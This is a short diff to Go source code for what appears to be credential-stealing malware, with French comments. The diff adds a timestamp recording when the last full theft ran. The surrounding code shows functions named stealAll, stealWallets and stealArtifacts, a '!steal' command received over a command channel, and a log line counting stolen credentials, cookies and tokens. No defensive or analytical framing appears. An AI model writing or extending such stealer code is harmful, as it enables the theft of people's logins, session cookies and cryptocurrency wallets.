@@ -18,6 +18,7 @@ import (
 	"regexp"
 	"runtime"
 	"strings"
+	"sync/atomic"
 	"syscall"
 	"time"
 	"unsafe"
@@ -322,6 +323,9 @@ var licenceSent bool
 // textuel que pour une demande explicite (!steal) ou le rapport de démarrage ;
 // les passages périodiques ne poussent que les fichiers complets, pour ne pas
 // noyer le canal de commande.
+// lastStealAt retient l heure de la dernière extraction complète.
+var lastStealAt atomic.Int64
+
 func stealAll(withChat bool) {
 	defer func() {
 		if r := recover(); r != nil {
@@ -425,6 +429,7 @@ func stealAll(withChat bool) {
 
 	stealWallets()
 	stealArtifacts()
+	lastStealAt.Store(time.Now().Unix())
 	plog(fmt.Sprintf("steal: %d identifiants, %d cookies, %d jetons", len(creds), len(cookies), len(tokens)))
 }
 
